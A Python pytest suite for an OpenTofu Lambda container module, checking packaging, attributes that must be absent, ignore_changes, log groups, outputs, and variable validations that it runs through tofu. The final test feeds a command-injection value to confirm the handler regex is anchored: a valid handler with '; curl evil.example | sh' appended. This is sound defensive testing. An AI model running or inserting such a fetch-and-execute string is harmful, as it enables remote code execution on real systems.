"""The `docker-lambda` module declares a container function and nothing a container cannot have.

Every Lambda in the repository becomes a call to this module, so what it declares — and what it
deliberately does not — is the fleet's shape. Four of the assertions here are about ABSENCES, and
an absence is what a test asserts worst, so each one names the failure it prevents rather than the
attribute it is missing.

The module is called by nobody until the cutover, which means `tofu validate` at the root does not
reach it: measured, a module referencing an undeclared variable leaves the root validate reporting
"Success!". A workflow step validates it in its own directory; this file covers what a validate
cannot see.

Attributes:
  MODULE: The module directory.
  MAIN / VARIABLES / OUTPUTS / README: Its four files.
  FUNCTION: The `aws_lambda_function` body, parsed once.
  ROOT_VARIABLES: The root `variables.tf`, which declares the image tag the module is given.
"""

import functools
import os
import pathlib
import re
import shutil
import subprocess
import tempfile

import pytest
from tf_blocks import blocks, strip_noise

ROOT = pathlib.Path(__file__).resolve().parent.parent
MODULE = ROOT / "infra" / "modules" / "docker-lambda"
MAIN = MODULE / "main.tf"
VARIABLES = MODULE / "variables.tf"
OUTPUTS = MODULE / "outputs.tf"
README = MODULE / "README.md"
ROOT_VARIABLES = ROOT / "infra" / "variables.tf"


@pytest.fixture(scope="module")
def function() -> str:
    """The module's one ``aws_lambda_function`` body.

    Args:
      None.

    Returns:
      The resource body as text.

    Raises:
      AssertionError: When the module declares no function, or more than one.
    """
    found = blocks(MAIN.read_text(encoding="utf-8"), "aws_lambda_function")
    assert list(found) == ["this"], (
        f"the module must declare exactly one function named `this`, found {sorted(found)}"
    )
    return found["this"]


@pytest.fixture(scope="module")
def function_code(function: str) -> str:
    """The same body with comments and string contents blanked.

    Every scan below that looks for an ATTRIBUTE NAME uses this rather than the raw text. The
    reason is not hypothetical: this module's own comment explains why a stale
    `ignore_changes = [layers]` would be a fossil, and the first version of the ignore assertion
    read that sentence and reported the module ignoring `layers` — a failure message describing
    something the file does not do.

    Args:
      function: The raw resource body.

    Returns:
      The body with comments and string contents blanked, length preserved.

    Raises:
      None.
    """
    return strip_noise(function)


def test_it_is_image_packaged_and_the_uri_is_built_from_the_two_inputs(function: str) -> None:
    """One image, one tag, one command — the whole point of the module.

    Args:
      function: The resource body.

    Returns:
      None.

    Raises:
      AssertionError: When the packaging is not what the fleet runs.
    """
    assert 'package_type = "Image"' in function
    assert 'image_uri    = "${var.image_repository_url}:${var.image_tag}"' in function
    assert re.search(r"image_config\s*\{\s*command\s*=\s*var\.command\s*\}", function), (
        "the command must come from the input; a command built here would make one image serve "
        "86 functions identically, which is the one thing it must not do"
    )


@pytest.mark.parametrize(
    ("attribute", "why"),
    [
        (
            "layers",
            (
                "a container function has none — its imports are a property of the image — and "
                "a stale ignore_changes = [layers] would be a fossil that reads as meaningful"
            ),
        ),
        ("handler", "Zip-only; an Image function is refused at apply, not by the schema"),
        ("runtime", "Zip-only, same as handler"),
        ("filename", "conflicts with image_uri outright"),
        (
            "source_code_hash",
            (
                "the placeholder zip is gone; an image is valid from the first apply, so the "
                "bootstrap artefact every zip function needed has no successor here"
            ),
        ),
    ],
)
def test_the_module_declares_no(attribute: str, why: str, function_code: str) -> None:
    """Five attributes a container function must not carry, each with the reason.

    Args:
      attribute: The attribute that must be absent.
      why: The reason it must be absent, quoted back on failure.
      function_code: The resource body, comments blanked.

    Returns:
      None.

    Raises:
      AssertionError: When the attribute is declared.
    """
    assert not re.search(rf"^\s*{attribute}\s*=", function_code, re.MULTILINE), (
        f"the module declares `{attribute}`: {why}"
    )


def test_only_the_image_uri_is_ignored(function_code: str) -> None:
    """`image_uri` and nothing else, because everything else here is Terraform's to own.

    The ignore is what makes CI responsible for pointing every function at every deploy —
    `image_uri` is not ForceNew, so Terraform CAN move it and simply never will. A pipeline that
    builds an image and points nothing at it leaves all 86 functions on the previous one, each
    still working.

    Args:
      function_code: The resource body, comments blanked.

    Returns:
      None.

    Raises:
      AssertionError: When the ignore list is not exactly `[image_uri]`.
    """
    ignored = re.search(r"ignore_changes\s*=\s*\[([^\]]*)\]", function_code)
    assert ignored, "the module must ignore image_uri, or every apply drags the fleet backwards"
    names = {n.strip() for n in ignored.group(1).split(",") if n.strip()}
    assert names == {"image_uri"}, (
        f"ignore_changes is {sorted(names)}; anything else here is an attribute Terraform owns "
        "and would silently stop reconciling"
    )


def test_the_module_creates_the_function_s_log_group(function_code: str) -> None:
    """A function and its log group cannot be declared in two places and disagree.

    Args:
      function_code: The resource body, comments blanked.

    Returns:
      None.

    Raises:
      AssertionError: When the log group is missing or the function does not wait for it.
    """
    groups = blocks(MAIN.read_text(encoding="utf-8"), "aws_cloudwatch_log_group")
    assert list(groups) == ["this"], f"expected one log group, found {sorted(groups)}"
    assert 'name              = "/aws/lambda/${var.function_name}"' in groups["this"]
    assert "retention_in_days = var.log_retention_days" in groups["this"], (
        "an undeclared retention is INFINITE, and checkov cannot see a group Lambda creates "
        "implicitly on first invoke"
    )
    # The comment-stripped body, like every other scan in this file. Against the RAW text this
    # passed on a `depends_on` deleted and replaced by a comment naming the resource — the whole
    # suite accepted it, and the group's name is built from var.function_name so there is no
    # implicit dependency to fall back on.
    assert re.search(r"depends_on\s*=\s*\[[^\]]*aws_cloudwatch_log_group\.this", function_code), (
        "the function must depend on its log group, or the first invocation can create the "
        "implicit infinite-retention one first"
    )


def test_the_three_outputs_a_consumer_needs_all_exist() -> None:
    """Name, ARN and invoke ARN — and the third is not optional.

    `invoke_arn` is the apigateway-form ARN an HTTP API integration takes. It cannot be derived
    from `function_arn` without rebuilding a string, which is the thing this module exists to
    stop, so a module offering only two outputs cannot express the API's integration at all.

    Args:
      None.

    Returns:
      None.

    Raises:
      AssertionError: When an output is missing.
    """
    declared = set(re.findall(r'^output\s+"([a-z_]+)"', OUTPUTS.read_text(), re.MULTILINE))
    for name in ("function_name", "function_arn", "invoke_arn"):
        assert name in declared, f"the module does not output {name}; declared: {sorted(declared)}"


def test_the_plan_visible_attributes_are_always_declared(function_code: str) -> None:
    """Memory, architecture and reserved concurrency are set, never left to the provider.

    Two reasons and the second is the one that bites. An unset memory tier is invisible in the
    plan and surfaces only as a production OOM. And an attribute the configuration does not set
    comes back UNKNOWN in a replacement plan while being present-and-refreshed in a no-op one —
    which is exactly the pair the cutover's parity fixture compares, so a defaulted field reads as
    "no value" on one side and a number on the other.

    Args:
      function_code: The resource body, comments blanked.

    Returns:
      None.

    Raises:
      AssertionError: When one is left to the provider's default.
    """
    for attribute in ("memory_size", "architectures", "reserved_concurrent_executions"):
        assert re.search(rf"^\s*{attribute}\s*=", function_code, re.MULTILINE), (
            f"{attribute} is not declared; it would be unknown in a replacement plan, which is "
            "what the cutover's parity comparison reads"
        )


def test_a_command_cannot_be_empty_or_malformed() -> None:
    """The image declares no CMD, so an empty command is a container that fails at INIT.

    Args:
      None.

    Returns:
      None.

    Raises:
      AssertionError: When either validation is missing.
    """
    text = VARIABLES.read_text(encoding="utf-8")
    command = text[text.index('variable "command"'):]
    command = command[: command.index("\nvariable ")] if "\nvariable " in command else command

    assert "length(var.command) > 0" in command, (
        "nothing refuses an empty command, and the Dockerfile declares no CMD to fall back on"
    )
    assert "regex(" in command, "nothing constrains the command's shape"


def test_the_image_tag_has_no_default_and_refuses_the_empty_string() -> None:
    """An empty ``TF_VAR_`` is not an unset one, and only a validation can tell them apart.

    An empty value satisfies a required variable AND overrides a default, and an unset repository
    variable renders as exactly that — so the absence of a default does not, on its own, stop an
    apply creating 86 functions from a tag nobody supplied.

    Args:
      None.

    Returns:
      None.

    Raises:
      AssertionError: When the variable carries a default or accepts an empty string.
    """
    text = ROOT_VARIABLES.read_text(encoding="utf-8")
    start = text.index('variable "lambda_image_tag"')
    body = text[start:]
    body = body[: body.index("\nvariable ")] if "\nvariable " in body else body

    assert not re.search(r"^\s*default\s*=", body, re.MULTILINE), (
        "lambda_image_tag must have NO default: the value is ignored after creation, so a stale "
        "default would create functions from an image nobody meant and nothing would correct it"
    )
    assert "validation" in body, "nothing refuses an empty TF_VAR_lambda_image_tag"


def test_the_module_has_a_readme_carrying_its_reasoning() -> None:
    """Every module in this tree has one beside its `.tf`, and it is under a size ratchet.

    Args:
      None.

    Returns:
      None.

    Raises:
      AssertionError: When the README is missing or says nothing about the ignore.
    """
    assert README.is_file(), f"{README} is missing; every module in infra/modules/ carries one"
    text = README.read_text(encoding="utf-8")
    assert "ignore_changes" in text and "update-function-code" in text, (
        "the README must state the arrangement that makes CI responsible for pointing every "
        "function, which is where the risk in this arc lives"
    )


def _tofu_accepts(value: str, variable: str = "lambda_image_tag",
                  source: pathlib.Path | None = None) -> bool:
    """Whether OpenTofu itself accepts a value for a variable.

    EVALUATED, not read. A validation block can be asserted present while its condition has been
    weakened to something that accepts anything, and only running it can tell those apart —
    `ci.yml` records that reasoning and `test_api_module.py` established the harness. Re-implementing
    the HCL pattern in Python `re` is also unsound in general: Python's `$` matches before a
    trailing newline and Go's RE2 does not, so a translation can disagree with the thing it claims
    to mirror.

    The declaration is lifted into a scratch module that declares no provider, so the init is
    offline and no credentials are involved.

    Args:
      value: The candidate value, already rendered as OpenTofu would receive it.
      variable: The variable to evaluate.
      source: The file declaring it, defaulting to the root variables.

    Returns:
      True when OpenTofu plans successfully with that value.

    Raises:
      AssertionError: When tofu is unavailable, or the declaration cannot be extracted — a skip
        would read as coverage this suite would not have.
    """
    tofu = shutil.which("tofu")
    assert tofu, "OpenTofu is not on PATH — this assertion cannot be skipped into passing"

    text = (source or ROOT_VARIABLES).read_text(encoding="utf-8")
    match = re.search(rf'variable\s+"{variable}"\s*\{{', text)
    assert match, f"{variable} is not declared"
    source_text = text
    index, depth = source_text.index("{", match.start()), 0
    while index < len(source_text):
        if source_text[index] == "{":
            depth += 1
        elif source_text[index] == "}":
            depth -= 1
            if depth == 0:
                break
        index += 1
    declaration = source_text[match.start(): index + 1]

    with tempfile.TemporaryDirectory() as scratch:
        pathlib.Path(scratch, "variables.tf").write_text(declaration + "\n")
        environment = {
            "PATH": os.environ.get("PATH", ""),
            "HOME": os.environ.get("HOME", ""),
            "TF_IN_AUTOMATION": "1",
            f"TF_VAR_{variable}": value,
        }
        setup = subprocess.run(  # noqa: S603
            [tofu, "init", "-backend=false", "-input=false"],
            cwd=scratch, env=environment, capture_output=True, text=True, check=False,
        )
        assert setup.returncode == 0, f"tofu init failed:\n{setup.stdout}\n{setup.stderr}"
        plan = subprocess.run(  # noqa: S603
            [tofu, "plan", "-input=false"],
            cwd=scratch, env=environment, capture_output=True, text=True, check=False,
        )
    return plan.returncode == 0


def test_opentofu_itself_refuses_an_empty_image_tag() -> None:
    """The refusal that matters, run rather than read.

    An empty `TF_VAR_` satisfies a required variable AND overrides a default, and an unset
    repository variable renders as exactly that — so this condition is the only thing between an
    unsupplied value and 86 functions created from a tag nobody chose. The positive case is here
    too: a validation that refuses everything would pass the negative alone.

    Args:
      None.

    Returns:
      None.

    Raises:
      AssertionError: When OpenTofu accepts an empty tag, or refuses a real sha.
    """
    assert _tofu_accepts("a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0"), (
        "OpenTofu refuses a real commit sha; the validation is too strict to be usable"
    )
    assert not _tofu_accepts(""), (
        "OpenTofu accepts an empty lambda_image_tag — an unset repository variable renders as "
        "exactly that, and the value is ignored after creation so nothing would correct it"
    )


def test_opentofu_itself_refuses_a_command_that_is_not_module_dot_handler() -> None:
    """The command validation, RUN rather than substring-matched.

    The shape is the whole contract between the image and 86 functions: the string has to be the
    handler the zip-packaged function carried, because that is what the parity fixture compares
    against. Asserting `regex(` is present cannot tell a pattern that constrains the shape from one
    whose anchors have been stripped — and an unanchored pattern accepts a command with anything
    appended to it.

    Args:
      None.

    Returns:
      None.

    Raises:
      AssertionError: When OpenTofu accepts a malformed command or refuses a real one.
    """
    module_variables = MODULE / "variables.tf"
    accepts = functools.partial(_tofu_accepts, variable="command", source=module_variables)

    assert accepts('["archive_copy_objects.handler"]'), "a real handler string is refused"
    assert not accepts("[]"), "an empty command is accepted; the image declares no CMD"
    assert not accepts('["not-snake-case.handler"]'), "a hyphenated module name is accepted"
    assert not accepts('["nodot"]'), "a command with no handler is accepted"
    assert not accepts('["ok.handler; curl evil.example | sh"]'), (
        "the pattern is unanchored — it accepts a valid prefix with anything appended"
    )
